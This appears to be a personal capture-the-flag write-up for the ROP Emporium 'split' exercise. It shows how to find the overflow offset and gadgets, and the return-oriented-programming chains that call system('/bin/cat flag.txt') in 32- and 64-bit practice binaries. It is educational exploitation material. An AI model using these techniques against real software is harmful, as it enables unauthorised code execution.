# split | ROP Emporium

```bash
kali@kali:~/Desktop/rop/split$ checksec --file=split32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73) Symbols       No    0               3               split32
```

## Steps
### 1. Investigate binary
Thanks to reading the excercise information, I know that the system function is still present in the binary, and so is the command to cat the flag as a string. I can verify both of these things as follows.
```bash
kali@kali:~/Desktop/rop/split$ rabin2 -i split32
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080483b0 GLOBAL FUNC       read
2   0x080483c0 GLOBAL FUNC       printf
3   0x080483d0 GLOBAL FUNC       puts
4   0x080483e0 GLOBAL FUNC       system
5   0x00000000 WEAK   NOTYPE     __gmon_start__
6   0x080483f0 GLOBAL FUNC       __libc_start_main
7   0x08048400 GLOBAL FUNC       setvbuf
8   0x08048410 GLOBAL FUNC       memset

kali@kali:~/Desktop/rop/split$ rabin2 -z split32
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt
```
I already know that these exercises follow a similar format, but to check the offset for any payload is still the same I can run a cyclic input through it.
```bash
kali@kali:~/Desktop/rop/split$ sudo dmesg -C
kali@kali:~/Desktop/rop/split$ python -c "from pwn import cyclic; print(cyclic(56))" | ./split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
Segmentation fault
kali@kali:~/Desktop/rop/split$ sudo dmesg -t
split32[3131]: segfault at 6161616c ip 000000006161616c sp 00000000ffd03cb0 error 14 in libc-2.30.so[f7d0b000+1d000]
Code: Bad RIP value.
```
I already know 6161616c is 44, because that's the same as what it was last time.  
Finally I can check the binary out in r2. This time it can be seen there is a function called "usefulFunction" present.
```bash
0x08048430]> pdf @sym.usefulFunction
┌ 25: sym.usefulFunction ();
│           0x0804860c      55             push ebp
│           0x0804860d      89e5           mov ebp, esp
│           0x0804860f      83ec08         sub esp, 8
│           0x08048612      83ec0c         sub esp, 0xc
│           0x08048615      680e870408     push str.bin_ls             ; 0x804870e ; "/bin/ls" ; const char *string
│           0x0804861a      e8c1fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0804861f      83c410         add esp, 0x10
│           0x08048622      90             nop
│           0x08048623      c9             leave
└           0x08048624      c3             ret
[0x08048430]>
```
Currently, the call to system() in this function is taking /bin/ls. So this will need to be replaced with the /bin/cat string.

### 3. Construct the payload
So what I would like to do is call the system function with the string "/bin/cat flag.txt" as the argument. To do this I need to construct a chain of these components together on the stack. This can be done due to the knowledge of the following information:  
- The system function is located at:    0x080483e0  
- The string I want is located at:      0x0804a030  

These get delivered following an offset of 44 bytes, with 4 bytes of padding between them to overwrite the base pointer position.

### 4. Run it against the binary to win
I can spew the input directly into the binary and get the flag.
```bash
kali@kali:~/Desktop/rop/split$ python solve.py manual | ./split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault
```
For the automated exploit, I noted the flag's address appears different when debugging the automated solution in GDB. Luckily this was easily worked around using pwntool's built in elf classes and functions. I also got a chance to play with some of the ROP-specific stuff within pwntools which was cool (see solve.py).  
```bash
kali@kali:~/Desktop/rop/split$ python solve.py
[*] '/home/kali/Desktop/rop/split/split32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/kali/Desktop/rop/split/split32': pid 4697
[*] Loaded 10 cached gadgets for 'split32'
[*] 0x0000:        0x80483e0 system(0x804a030)
    0x0004:           'baaa' <return address>
    0x0008:        0x804a030 usefulString
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> 
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Stopped process '/home/kali/Desktop/rop/split/split32' (pid 4697)
```

## Differences in architecture
The x64 binary exploit requires some modification, not only due to larger memory addresses and a smaller payload offset, but also due to the fact that 64 bit binaries load arguments from registers and not the stack. This means employing the use of another gadget in order to get the "/bin/cat" string into a register.  
Referring to https://trustfoundry.net/basic-rop-techniques-and-tricks/ - I know an ideal gadget to get a value into a register is a "pop register; ret;" gadget.
Using ropper I can see what gadgets are available to me within the binary and narrow it down to those with a pop instruction.
```bash
ali@kali:~/Desktop/rop/split$ ropper --file split --search pop
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: split
0x00000000004007bc: pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004007be: pop r13; pop r14; pop r15; ret; 
0x00000000004007c0: pop r14; pop r15; ret; 
0x00000000004007c2: pop r15; ret; 
0x000000000040060b: pop rbp; mov edi, 0x601078; jmp rax; 
0x00000000004007bb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004007bf: pop rbp; pop r14; pop r15; ret; 
0x0000000000400618: pop rbp; ret; 
0x00000000004007c3: pop rdi; ret; 				<------ This one!
0x00000000004007c1: pop rsi; pop r15; ret; 
0x00000000004007bd: pop rsp; pop r13; pop r14; pop r15; ret;
```
In addition to this gadget, I also need to collect the new addresses for the "/bin/cat" string and system function. Using the same techniques done for the x86 binary, the final locations for my rop chain items are (addresses cut down to 32 bit values):
- System function:	0x00400560  
- /bin/cat string:	0x00601060  
- pop rdi; ret:		0x004007c3  
  
Now I can modify my exploit to include the gadget which puts the "/bin/cat" string into rdi before calling system (see solve64.py).  
```bash
kali@kali:~/Desktop/rop/split$ python solve64.py manual | ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault

kali@kali:~/Desktop/rop/split$ python solve64.py
[*] '/home/kali/Desktop/rop/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/kali/Desktop/rop/split/split': pid 2589
[*] Loaded 14 cached gadgets for 'split'
[*] 0x0000:         0x4007c3 pop rdi; ret
    0x0008:         0x601060 [arg0] rdi = usefulString
    0x0010:         0x400560 system
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> 
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Stopped process '/home/kali/Desktop/rop/split/split' (pid 2589)
```
